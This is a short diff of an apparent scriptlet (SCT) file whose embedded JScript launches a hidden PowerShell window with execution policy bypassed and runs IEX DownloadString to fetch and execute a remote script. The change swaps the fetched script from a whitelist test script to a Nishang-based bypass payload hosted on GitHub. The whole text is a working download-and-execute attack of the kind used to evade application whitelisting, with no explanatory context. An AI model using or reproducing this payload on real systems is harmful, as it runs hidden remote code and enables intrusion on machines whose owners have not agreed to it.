@@ -7,7 +7,7 @@
     <script language="JScript">
 		<![CDATA[
            	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
-            c = "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')";
+            c = "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/nishang/NishangSctBypass.ps1')";
             r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
 		]]>
 	</script>
